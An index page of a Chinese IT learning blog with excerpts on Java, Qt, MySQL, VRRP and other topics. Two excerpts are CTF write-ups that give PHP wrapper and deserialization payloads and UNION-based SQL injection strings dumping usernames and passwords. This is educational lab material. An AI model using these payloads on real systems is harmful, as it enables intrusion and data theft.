<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>IT学习者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="IT学习者博客">
		<meta property="og:title" content="IT学习者博客" />
<meta property="og:description" content="IT学习者博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://itnewbiea.github.io/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="IT学习者博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="IT学习者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">IT学习者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/03a4741aff485bc4140376fd5c28551c/" rel="bookmark">
			sharding-jdbc实现读写分离
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		读写分离的概念大家应该已经很熟练了，此处不在赘述，下面我们通过sharding-jdbc来实现读写分离，其实大家应该已经发现了，所有的操作都是配置问题，下面我们来讲一下具体的配置，关于读写分离的原理，以及如何配置mysql的主从复制，我们就不在多聊了，直接看sharding-jdbc的配置。
1、我们规定ds1为写库，ds2为读库
2、创建person类
详情参考：http://www.ysxbohui.com/article/99
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c219b361034ce189b2d85a6f0477f5c5/" rel="bookmark">
			每天一道ctf
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一.[ZJCTF 2019]NiZhuanSiWei 看到注释有 useless.php于是访问一下
发现什么都没有
代码审计：有这样一行代码isset($text)&amp;&amp;(file_get_contents($text,'r')==="welcome to the zjctf"，我们需要传入一个内容为welcome to the zjctf的文件。这时就要用到data协议
data协议通常是用来执行PHP代码，也可以将内容写入data协议中，然后让file_get_contents函数取读取。构造：data://text/plain,welcome to the zjctf，为了绕过某些过滤，这里用到base64编码。构造payload：text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=。
然后有一个可控参数file，构造file=useless.php，但是针对php文件我们需要进行base64编码，否则读取不到其内容，所以构造payload：file=php://filter/read=convert.base64-encode/resource=useless.php。
得到以下经过base64加密的字符，
然后base64解密，得到 useless.php的内容
&lt;?php ​ class Flag{ //flag.php public $file; public function __tostring(){ if(isset($this-&gt;file)){ echo file_get_contents($this-&gt;file); echo "&lt;br&gt;"; return ("U R SO CLOSE !///COME ON PLZ"); } } } ?&gt; 需要调用flag，序列化处理
&lt;?php class Flag{ public $file='flag.php'; public function __tostring(){ if(isset($this-&gt;file)){ echo file_get_contents($this-&gt;file); echo "&lt;br&gt;"; return ("U R SO CLOSE !///COME ON PLZ"); } } } $password=new Flag(); $password = serialize($password); echo $password; ?
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c219b361034ce189b2d85a6f0477f5c5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ff8b77e55b61d47b40169f701fac9a67/" rel="bookmark">
			replace的使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		replace的用法 String.prototype.replace(参数1，参数2)
返回新的字符串，原来的字符串不会发生改变
const str = "我想你"; const result = str.replace("想", "爱"); console.log(str, result); // 我想你 我爱你 第一个参数为匹配模式：模式可以是一个字符串或者正则表达式
第二个参数为替换值：替换值可以是一个字符串或者一个每次匹配都要调用的回调函数
replace搭配正则的使用 1）整个字符串去精准匹配-替换
const str = "我想你,好想你,我真的好想打你"; const result = str.replace(/想你/g, "恨他"); console.log(result); // 我恨他,好恨他；我真的好想打你 这里replace使用了正则进行全局的精准匹配，所有的”想你“两个字，都被替换成了”恨他“
2）将每一个字进行匹配-替换
这是第二个参数为一个函数，函数将前面用来匹配的字符串，替换成新的字符串
const str = "我想你,好想你，我真的好想打你"; const result = str.replace(/[想你]/g, (item) =&gt; `&lt;em&gt;${item}&lt;/em&gt;`); console.log(result) // 我想你,好想你,我真的好想打你 我&lt;em&gt;想&lt;/em&gt;&lt;em&gt;你&lt;/em&gt;,好&lt;em&gt;想&lt;/em&gt;&lt;em&gt;你&lt;/em&gt;，却不 露痕迹；我真的好&lt;em&gt;想&lt;/em&gt;打&lt;em&gt;你&lt;/em&gt; 这两种是常用的匹配替换，搜索高亮经常用
如果想要在正则中使用变量，就要使用 new RegExp() 来生成正则了
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/582e88d17bab1ffeda947a6b77c89c3d/" rel="bookmark">
			Hyper-V安装（Windows11为例）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		相信大家都是看了其他博客的Hyper-V.cmd不行才来的。我这里整合了其他的方式大家可以试试。
1.传统方式 创建一个hyper-v的txt文件，然后重命名为hyper-v.cmd文件,再以管理员的方式进行运行。
hyper-v.txt内容如下:
pushd "%~dp0" dir /b %SystemRoot%\servicing\Packages*Hyper-V*.mum &gt;hyper-v.txt for /f %%i in ('findstr /i . hyper-v.txt 2^&gt;nul') do dism /online /norestart /add-package:"%SystemRoot%\servicing\Packages%%i" del hyper-v.txt Dism /online /enable-feature /featurename:Microsoft-Hyper-V-All /LimitAccess /ALL pause 如果可以,恭喜你,可以不用向下看了。
注意:
1.内容中的双引号、单引号一定要是因为格式!!!
2.编码格式要正确!!!
2.bat方式 我就是这个方式可以的
同样是创建hyper-v.txt文件,然后重命名为hyper-v.bat文件,再以管理员的方式运行。
注意方式如上图所示
hyper-v.txt的内容如下:
pushd "%~dp0" dir /b %SystemRoot%\servicing\Packages\*Hyper-V*.mum &gt;hv.txt for /f %%i in ('findstr /i . hv.txt 2^&gt;nul') do dism /online /norestart /add-package:"%SystemRoot%\servicing\Packages\%%i" del hv.txt Dism /online /enable-feature /featurename:Microsoft-Hyper-V -All /LimitAccess /ALL pause 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/582e88d17bab1ffeda947a6b77c89c3d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3455563838fc30ac390caa23a736ac9a/" rel="bookmark">
			Ribbon架构篇 - ZoneAvoidanceRule
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 ZoneAvoidanceRule 基于分区下的服务器的可用性选出可用分区列表，再从可用分区列表中随机选择一个分区，采用轮询的策略选择该分区的一个服务器。
ZoneAwareLoadBalancer 属性属性描述默认值ZoneAwareNIWSDiscoveryLoadBalancer.enabled是否开启ZoneAwareLoadBalancertrueniws.loadbalancer.default.connectionFailureCountThreshold连接失败的数量的阈值3niws.loadbalancer.default.circuitTripTimeoutFactorSeconds断路器打开的超时时间因子10niws.loadbalancer.default.circuitTripMaxTimeoutSeconds断路器打开的超时时间阈值30ZoneAwareNIWSDiscoveryLoadBalancer.default.triggeringLoadPerServerThreshold每台服务器的负载的阈值0.2niws.loadbalancer.serverStats.activeRequestsCount.effectiveWindowSeconds活跃请求数发生变化的超时时间600ZoneAwareNIWSDiscoveryLoadBalancer.default.avoidZoneWithBlackoutPercetage服务器故障率阈值0.99999 @Override public Server chooseServer(Object key) { // 如果没有开启 ZoneAwareLoadBalancer 或者 LoadBalancerStats记录的可用分区数 &lt;= 1 // 则执行 BaseLoadBalancer#chooseServer(...) 的逻辑 if (!ENABLED.get() || getLoadBalancerStats().getAvailableZones().size() &lt;= 1) { logger.debug("Zone aware logic disabled or there is only one zone"); return super.chooseServer(key); } Server server = null; try { LoadBalancerStats lbStats = getLoadBalancerStats(); // 创建分区快照 Map&lt;String, ZoneSnapshot&gt; zoneSnapshot = ZoneAvoidanceRule.createSnapshot(lbStats); logger.debug("Zone snapshots: {}", zoneSnapshot); if (triggeringLoad == null) { triggeringLoad = DynamicPropertyFactory.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3455563838fc30ac390caa23a736ac9a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/13c2a8e277c1654a9f0404561b82c66c/" rel="bookmark">
			OpenCASCADE（OCC）x86环境的配置以及在MFC中的应用（初探）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、Open cascade-7.6.0资源包的下载： Download - Open CASCADE Technology
Download - Open CASCADE Technology
下载解压后的文件夹包含一下内容（不包含build文件夹，这是我后来CMake的时候新建的！！！）：
二、三方库的下载 有些必需三方库（3rd party Components）的下载地址：3rd party Components | Open CASCADE Technology
因为我想在x86 环境下使用，所以下载的是32位的。
至此，下载了一共5个文件夹，这四个加上开始的open cascade-7.6.0。把他们整理在一个文件夹中，方便使用。我新建了一个文件夹名位 OCCT_32 ，把它们放在了这里面。
三、开始利用CMake配置并且编译生成我们需要的库 CMake的下载：Download | CMake
目前最新版本的cmake是3.25.0， 我下载的是cmake-3.24.2版本。
开始CMake之前，先在opencascade-7.6.0文件夹中新建一个空文件夹build ，方便我们存放CMake的内容。
接下来打开CMake软件，先把Grouped打上对号，方便看，不然有点密密麻麻：
点击左下方Configure，弹出新的界面，用来选择你使用VS的版本，和要配置的计算机位数，我选择的是32位（默认是32位）。
点击finish。出现一下内容。
首先操作USE里的内容：
将USE_VTK 和 USE_FREEIMAGE勾上（绿色箭头标的这两个）
接着操作INSTALL里的内容：
更改INSTALL_DIR目录(默认目录的话，需要用管理员身份打开VS2017，才能将编译好的文件安装到该目录下) 我在D盘下新建了一个名为OCCTxxxx86的文件夹，准备安装在这里。
接着操作BUILD：
在BUILD_SAMPLES_MFC上打上对号。
最后操作3RDPARTY（也就是三方工具库）
将这三部分进行添加之前下载的三方库路径：
1. 3RDPARTY_FREETYPE_DIR
解压后的freetype-2.5.5-vc14-32根路径即可：C:\Users\Administrator\Desktop\OCCT_32\freetype-2.5.5-vc14-32
2. 3RDPARTY_TCL_DIR
解压后的tcltk-86-32根路径即可： C:\Users\Administrator\Desktop\OCCT_32\tcltk-86-32
3. 3RDPARTY_TK_DIR
它和 3RDPARTY_TCL_DIR 的添加路径一样，即：C:\Users\Administrator\Desktop\OCCT_32\tcltk-86-32
点击Configure 还需要配置最后一些东西;
INSTALL里面的INSTALL_FREEIMAGE 和 INSTALL_VTK都不用勾选。
我们只添加它上面 3RDPARTY 里面的两个路径：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/13c2a8e277c1654a9f0404561b82c66c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/13bdd78edc6b49a985e742fa1fa19588/" rel="bookmark">
			JavaSE基础
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		概念：
1）8种基本数据类型：byte，short，int，long，double，float，boolean，char。
2) ASCLL码表：A：65 a：97 。
3）类型转换：自动类型转换 &amp; 强制类型转换。
数组：
特征：1）存放多个数据类型一致的数据
2）元素下标从0开始
3）数组长度固定，一旦定义后，不可改变 。
运算符：
1）算数运算符 ： + - * / % 加减乘除，取余。
2）赋值运算符 ： = 赋值 ，+= 加后赋值，-= 减后赋值 ， *= 乘后赋值，/= 除后赋值 ， %= 取余后赋值。
3）比较运算符 ： == ，!= ，&gt;，&gt;=，&lt;= 。
4）逻辑运算符 ： &amp;&amp; ， || ，! 。
for循环：
1）初始变量，2）终止循环的条件，3）自变量。
2）i++： 先参与表达式，再执行自增。
3）++i ：先自加，再参与表达式。
String 字符串操作：
1）spilt() 操作，分割字符串：传进去一个字符串（分隔符），将字符串分割返回数组。
2）subString() ，截取字符串 ：subString(0,1) 包头不包尾
3）startWith() ，判断以....开始。
4）toCharArray : 将字符串转成字符数组，例如
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/13bdd78edc6b49a985e742fa1fa19588/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0d9fc088c89a5eaf8609cb1eeb8bb8e4/" rel="bookmark">
			WPS高级教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		WPS高级教程 WPS表格第一章 走进WPS2019表格软件的世界第一节 数据录入基础第二节 表格样式布局第三节 数据分析必备第四节 表格函数计算第五节 常用图表制作第六节 高效操作技巧 第二章 走进WPS2019演示软件的世界第一节 幻灯片的基础操作第二节 幻灯片的段落排版第三节 幻灯片的页面布局第四节 音视频表格与图形第五节 配色、美化与动画第七节 常用操作技巧 WPS表格 第一章 走进WPS2019表格软件的世界 第一节 数据录入基础 数据隔行隔列输入 Enter 隔行输入；Tab隔列输入； 行列的插入、删除、隐藏和取消隐藏
填充柄快速录入
设置单元格格式批量转换数据
ctrl+1 进入单元格设置；
单元格格式有:数值、货币、会计专用、日期、时间、百分比、分数、科学计数、文本、特殊。 设置录入条件和下拉菜单
选中区域——数值——有效性；妙用填充柄ctrl+D填充法 ctrl+shift+↑ ：向上快速选择；ctrl+D ：快速向下复制粘贴； 智能填充Ctrl+E实用填充快捷键； 提取字符：如果从身份证上提取生日，先在第一行输入正确的生日。【开始】——【填充】——【智能填充】、快捷键为【ctrl+E】替换字符：添加字符；合并字符；重组字符； 单元格内换行 自动换行 单元格内换行：Alt+Enter自动换行：【开始】——【自动换行】 第二节 表格样式布局 内容布局基础 添加序号添加边框：ctrl+1可以设置单元格格式添加标题：【开始】——【合并居中】设置对齐：对齐方式分为“居中”、“居右”、“居左”、“两端对齐”；调整字体：常用微软雅黑，正文字号常用12和14号字体；（列宽不够时会显示##字样，双击列标右下角） 一键调整 行高列宽表格大小 点击一下单元格左上角三角形标志全选表格区域，此时任意的拖动一个行高和列宽，整个表格的行高和列宽都会进行同样的调整。调整好一个合适的行高列宽的单元格，然后在【开始】——【行和列】。如果超过打印范围，可以在【开始】——【自动换行】。 智能套用 表格样式设计 设置表格样式的基础操作是：【开始】——【颜色填充】（字体颜色设置也相同）套用表格样式：【开始】——【表格样式】，选择一个表格样式套用即可。选中表格区域，快捷键CTRL+T也可进行设置。隐藏网络线：【视图】点击取消勾选“显示网络线”。 格式刷 批量调整样式 格式刷基础的使用方法是：按住鼠标左键选中已经设置好样式的单元格，【开始】——【格式刷】，点击另一个单元格区域，发现格式马上复制过去了双击格式刷可以固定格式刷，可以无限次套用格式至其他单元格，按Enter取消格式刷；快速隔行填充：复制两行单元格，单击格式刷，框架套用格式单元格区域。 冻结行列窗格 看数据必备 冻结首行首列：【开始】——【冻结窗口】——【冻结首行】。取消冻结的方法是点击【开始】——【冻结窗口】——【取消冻结窗口】。冻结多行多列：选中某个单元格，此时冻结窗口就可以看到“冻结至某行某列”。 斜线表头 展示项目名称 设置斜线表头：单击右键【单元格格式】——【边框】，用空格键调整位置； 快速分列 数据妙整理 分列：【数据】——【分列】； 横排转竖排 数据更清晰 横排转竖排：CTRL+A复制单元格内容。再单击右键——【选择性粘贴】——【内容转置】； 如何批量删除 表格空白行 使用定位工具：第一步：【开始】——【查找】——【定位】；可以使用组合键【CTRL+G】；第二步：在定位框中，选择条件为空值，右键——删除——整行即可。当表格既有空行又有空白单元格时，可以使用COUNTA函数：第一步，在表格右侧新建一列辅助列，选中名称框。第二步，在公式栏中输入“=COUNTA(X,Y)”然后按“ctrl+Enter”键全部填充。第三步，点击【开始】——【筛选】按钮，将数值为零的行筛选出来，删除即可。 第三节 数据分析必备 如何快速 查找与替换数据 查找：【CTRL+F】替换：【CTRL+H] 快速定位 查阅数据 第一种方法：【Ctrl+home】定位到第一个单元格。【Ctrl+↑】【Ctrl+←】也可以；第二种方法：【Ctrl+end】定位到最后一个单元格。【Ctrl+↓】【Ctrl+→】也可以； 数字按大小排序 文字首字母排序 首先框选需要排序的数据，单击【单击】——【排序】下拉选择【降序】，在排序编辑框中可选择【扩展选定区域】或【以当前选定区域】，【以当前选定区域】的意思是只对当前列的数据排序，选择【扩展选定区域】。单击【自定义排序】，主要关键字选择需要的列。 快速筛选分类数据 选中“测试项目”单元格，在菜单栏【开始】——【筛选】或使用【Ctrl+shift+L】设置。 巧用重复项 快速去重 第一步：选中表格，点击【数据】——【重复项】点击设置重复高亮项。第二步：再次选择【重复项】——【删除重复项】如何避免重复录入：第一步，鼠标选中要防止数据重复输入的单元格，点击【数据】——【重复项】，选择“拒绝录入重复项”。 智能汇总 自动分类汇总 首先，要先对测试项目进行排序，这一步是必要的，否则分类汇总可能出错，点击【数据】——【升序】，对表格进行排序，这一步是必要的。然后【Ctrl+A】全选表格数据区域，【开始】——【分类汇总】； 求和快捷点 ALT+= 选中需要求和的数据列的下一行，输入【ALT + =】，马上求和完成了。 超快捷的数据核对法 找差项 【Ctrl+A】全选第一个表格，【Ctrl+c】。【Ctrl+A]全选另一个表格，【右键】——【选择性粘贴】，选择减。如果两个相减为非零的值。 第四节 表格函数计算 表格计算入门 函数加减乘除 函数的输入方式有三种：在编辑栏输入、在单元格输入、点击插入函数。函数的类别分为：财务、日期与时间、数学与三角、统计、查找与引用、数据库、文本、逻辑、信息、工程。计算总分：加法 sum(单元格：单元格)；减法：IMSUB(单元格：单元格)；乘法对应PRODUCT(单元格，单元格)；除法：PRODUCT（单元格，1/单元格)； 函数基础知识 相对绝对混合引用 相对引用：复制单元格公式时，公式随着引用单元格的变化而变化。绝对引用：复制公式随着引用单元格的位置变化而不会变化，用F4添加绝对引用；混合引用：以上两种引用都使用叫绝对引用。 工作中常用的三个函数 VLOOKUP函数是一个查找函数：语法结构是=VLOOKUP（查找值，数据表，列序数，匹配条件）
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0d9fc088c89a5eaf8609cb1eeb8bb8e4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/756b3ea41b6e80f5a74ea210e7a92359/" rel="bookmark">
			QT&#43;QTimer&#43;QThread实现线程内的定时任务并且和主线程进行交互
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		提示：文章写完后，目录可以自动生成，如何生成可参考右边的帮助文档
文章目录 前言一、moveToThread1.主线程头文件，主线程窗口类里面新建以下变量2.主线程生成定时器并迁移到线程中 二、继承QThread，在thread里造个计时器，然后信号通信1.继承线程的写法2.主线程调用 总结 前言 在制作qt软件时，我们经常会用到qtimer定时器以及将其在非主线程中进行使用，甚至有的时候还需要和主线程进行交互。我总结了两种用法，仅供参考
一、moveToThread 1.主线程头文件，主线程窗口类里面新建以下变量 代码如下：一个时间间隔，两个变量。记得初始化指针为空
const int m_timer_interval__ = 5000; QTimer* monitor_timer__ = nullptr; QThread* monitor_thread__ = nullptr; 2.主线程生成定时器并迁移到线程中 代码如下：qtimer不要有parent，线程可以有。先开线程，再开定时器，开启定时器以后，再迁移到线程中即可。
monitor_thread__ = new QThread(this); monitor_thread__-&gt;start(); monitor_timer__ = new QTimer(); connect(monitor_timer__, SIGNAL(timeout()), this, SLOT(GetResource()), Qt::DirectConnection); monitor_timer__-&gt;start(m_timer_interval__); monitor_timer__-&gt;moveToThread(monitor_thread__); connect(monitor_thread__, SIGNAL(started()), monitor_timer__, SLOT(start())); connect(monitor_thread__, SIGNAL(finished()), monitor_timer__, SLOT(stop())); GetRsource()可以换成任何你想定时执行的任务（主线程的函数即可），如果要交互，可以用信号和槽理论上时可以和主线程之间通信的。
二、继承QThread，在thread里造个计时器，然后信号通信 1.继承线程的写法 代码如下，h：
#pragma once #include &lt;qthread.h&gt; #include &lt;atomic&gt; #include &lt;QMutex&gt; #include &lt;QWaitCondition&gt; class timerThread : public QThread { Q_OBJECT public: timerThread(QObject* parent = nullptr); ~timerThread() override; enum State { Stoped, ///&lt;停止状态，包括从未启动过和启动后被停止 Running, ///&lt;运行状态 Paused ///&lt;暂停状态 }; State state() const; private: std::atomic_bool pauseFlag; std::atomic_bool stopFlag; QMutex mutex; QWaitCondition condition; QTimer* _timer = nullptr; public slots: void timerRun();//用于反复跑的内容 void start(Priority pri = InheritPriority); void stop_th(); void pause(); void resume(); protected: virtual void run() override final; signals: void sendCtrlSignal();//和主线程交互触发的signal }; 代码如下，cpp：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/756b3ea41b6e80f5a74ea210e7a92359/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2f99511c93284be354a57cd51f2ebec2/" rel="bookmark">
			java中a&#43;&#43;和&#43;&#43;a的区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.当作为独立语句使用时，a++和++a是一个效果，都等价于a=a+1
public class test { public static void main(String[] args) { int a = 1; a++; ++a; System.out.println(a); } } 2.作为表达式使用：++a先自增后赋值；a++先赋值后自增
public class test { public static void main(String[] args) { int a = 1; int b = a++; int c = ++a; System.out.println(b); System.out.println(c); } } 以上，下面有这样两个题目：
此时i输出的值是多少？
这里是后++，计算机内部其实是这样的一个执行步骤：
(1)temp=i (2)i=i+1 (3)i=temp
显然可得i的输出仍然是1
那么，变换一下题目，如下：
这个时候的i输出是多少呢？
按照上面的步骤，我们来分析一下：
(1)i=i+1 (2)temp=i (3)i=temp 结果输出2
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6a6978daca2edeb377c3a2421c76520c/" rel="bookmark">
			VRRP概念及工作过程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		VRRP的基本概念 VRRP是一种容错协议，通过把多台路由设备组合成为一台虚拟路由设备，同时让物理路由器对外隐藏各自的信息，当其中一台设备出现故障，可以切换到别的设备上进行数据的通信，实现了通信的可靠。
VRRP在不改变组网的情况下，提供了虚拟的网关IP地址和MAC地址,实现了网关冗余。
VRRP相关术语 1、VRRP组:VRRP组有多台路由器组成，在局域网终端设备看起来就像是一台路由器（虚拟路由器）。
2、虚拟IP地址:是虚拟路由器的IP地址，局域网中的终端设备所用的网关即为VRRP组中的虚拟IP地址。
3、虚拟MAC地址:是虚拟路由器的MAC地址，局域网中的终端设备封装数据所使用的MAC地址，就是虚拟MAC地址。
4、VRID:标识不同的VRRP组的标识符。
5、抢占：如果一台VRRP路由器工作在抢占模式下，那么当这台路由器的VRRP优先级高于主用路由器时，这台路由器就会成为主用路由器。
6、主用设备:承担局域网网关设备，进行数据的转发。
7、备用设备:当主设备挂掉后，顶替主设备位置。
VRRP工作过程 先在VRRP组中选举主用路由器，先比较优先级，优先级值越大越优，优先级高的接口成为主用路由器。如果优先级相同，比较接口IP地址，IP地址值大的成为主用路由器。主用路由器选举完成后，VRRP组内的其他路由器都会是备用路由器，主用路由器会主动的响应局域网中的ARP信息，来通告VRRP组的虚拟MAC地址，并周期性的向VRRP组内的其他路由器发送自己的信息和状态。当局域网中的终端设备都获取到了网关IP和MAC地址后，他们就会使用VRRP主用路由器发来的虚拟IP地和MAC地址来封装数据，只有主用路由器数据的处理和转发，其他的备用路由器丢弃数据。当主用路由器出现故障，那么VRRP组内的备用路由器就会因为没有在规定时间内收到主用路由器的信息，而重新竞选主用路由器，这个过程终端设备并不知道，不影响终端设备继续使用VRRP虚拟地址来封装转发数据。
如有错误，欢迎各位读者给予指导。
如有侵权，请及时联系。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2258fc9a839b55dc12a83b5e9c21ef66/" rel="bookmark">
			el-upload单文件上传，单选文件 覆盖已有文件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原文地址：element-ui上传组件（el-upload）单文件上传，单选文件 覆盖已有文件_debugger-ed的博客-CSDN博客_element upload 单文件
需求：单选文件上传，每次只允许一个文件上传，当已选择了文件再次点击选择其他的文件时，需要覆盖上次选择的文件。但是看了看el-upload的开发文档，好像不支持这个需求，选择新的文件后无法替代旧的。研究了下源码找到了实现方法。
解决方案
思路
利用el-upload的on-exceed，该方法是文件超出个数限制时的钩子，当把上传文件数最大设置为1的时候再次选择新文件时会触发这个方法，利用这个对文件进行重新赋值即可。
on-exceed的回调函数有两个参数function(files, fileList)，files为当前选择的文件，fileList已经选择后的文件（上次选择的），可以对fileList进行赋值来修改上传时的文件。但是只修改fileList是不够的，还需要修改el-upload里的uploadFiles，保持数据同步，不然上传后的回调函数里的字段会报错。
实例代码
HTML部分
&lt;el-upload
class="col-md-6 col-lg-6 col-xs-12"
ref="rebateUpload"
:multiple="false"
:action="config.interfaceIP+'xxx'"
:headers=" {'X-CSRF-TOKEN':this.config.csrfToken}"
:data="{type:uploadType}"
:before-upload="()=&gt;{$loading({lock: true,text: '上传中...',spinner: 'el-icon-loading',
background: 'rgba(0, 0, 0, 0.7)'});}"
:on-success="uploadRequest"
:limit="1"
:on-exceed="uploadExceed"
:auto-upload="false"&gt;
&lt;el-button slot="trigger" type="primary"&gt;选取文件&lt;/el-button&gt;
&lt;el-button style="margin-left: 10px;" type="success" @click="()=&gt;{$refs['rebateUpload'].submit()}"&gt;
上传
&lt;/el-button&gt;
&lt;/el-upload&gt;
注：该上传为手动上传
JS部分
uploadExceed(files, fileList) {
this.$set(fileList[0], 'raw', files[0]);
this.$set(fileList[0], 'name', files[0].name);
this.$refs['rebateUpload'].clearFiles();//清除文件
this.$refs['rebateUpload'].handleStart(files[0]);//选择文件后的赋值方法
},
总结
因为单选所以只要覆盖第一个值就可以了，fileList[0], '里的raw', 为选中的文件，同时替换掉文件的文件名name，再清除文件为el-upload里的uploadFiles重新赋值。
————————————————
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1846bcdfde963d5e830767b4413d86a2/" rel="bookmark">
			解决Failed to connect to github.com port 443 after 21113 ms: Timed out
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Failed to connect to github.com port 443 after 21113 ms: Timed out （连接失败超时）
解决方案，分别执行 取消全局代理。
//取消全局代理： git config --global --unset http.proxy git config --global --unset https.proxy 如下：
书到用时方恨少，纸上得来终觉浅。祝你思维敏捷，代码精简。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bd681bce4dcbb2e8164b1c1150f59816/" rel="bookmark">
			Linux 查询正在运行的shell脚本命令
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.查看当前运行的所有进程。
ps -A
2.如果太多了找不到，看的眼花，可以加条件 grep是分组 查看正在运行的shell脚本的进程shell脚本就是 sh
ps -ef |grep sh
如图下面就是查询出来的所有sh脚本，看第三列就是脚本的进程UID，直接杀死UID就行
3.杀死进程UID
kill 4491
如图 直接杀就行
如果查看其它的脚本比如 python的脚本
ps -ef |grep python
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b1834f91ba2c593faaefd3f3ad56f41c/" rel="bookmark">
			ctfshow sql注入 171~
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		参考：
https://y4tacker.blog.csdn.net/article/details/110144623
https://blog.51cto.com/u_15072927/3946335
171 爆库：-1'union select 1,2,database();--+ 爆表：-1'union select 1,2,group_concat(table_name) from information_schema.tables where table_schema="ctfshow_web";--+ 爆列：-1'union select 1,2,group_concat(column_name) from information_schema.columns where table_name="ctfshow_user" --+ 爆值：-1'union select id,username,password from ctfshow_user --+ 172 这题只有两个回显，且返回值不能有flag，可以用编码回显。
-1'union select to_base64(username),hex(password) from ctfshow_user2 --+ 或
-1'union select id,password from ctfshow_user2 where username="flag"--+ 联合查询列数和以前一样，可以查id，这样就不会返回username中的flag值
173 //检查结果是否有flag if(!preg_match('/flag/i', json_encode($ret))){ $ret['msg']='查询成功'; } 同上
1' union select id,to_base64(username),hex(password) from ctfshow_user3--+ 174 法1：
虽然它对返回的值有限制，但是我们可以用盲注，例如下面的会返回：
1'and 1=1;--+
抓包看一下地址
import requests url = "http://82424899-6cd3-4fab-83ca-7cf8d1f9caa3.challenge.ctf.show/api/v4.php?id=1' and "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b1834f91ba2c593faaefd3f3ad56f41c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3f98c4f87c786e59074dcca8cb855ce4/" rel="bookmark">
			MySQL进阶-单列索引与联合索引
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		单列索引：即一个索引只包含单个列。联合索引：即一个索引包含了多个列。 们先来看看 tb_user 表中目前的索引情况:
在查询出来的索引中，既有单列索引，又有联合索引。
接下来，我们来执行一条SQL语句，看看其执行计划：
